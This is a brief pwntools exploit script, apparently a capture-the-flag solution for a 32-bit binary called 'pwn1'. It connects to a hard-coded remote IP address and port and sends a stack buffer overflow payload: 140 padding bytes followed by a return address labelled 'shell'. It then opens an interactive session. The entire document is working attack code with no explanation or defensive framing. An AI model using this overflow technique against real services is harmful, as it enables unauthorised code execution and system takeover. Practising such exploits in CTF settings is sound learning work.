#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
context.arch = 'i386'
context.terminal = ['tmux', 'sp', '-h']
local = 0
if local:
    p = process('./pwn1')
else:
    p = remote('104.154.106.182', 2345)
# gdb.attach(p)
shell = 0x080484ad
payload = 'A' * 140 + p32(shell)
# payload = cyclic(500)
p.sendline(payload)
p.interactive()
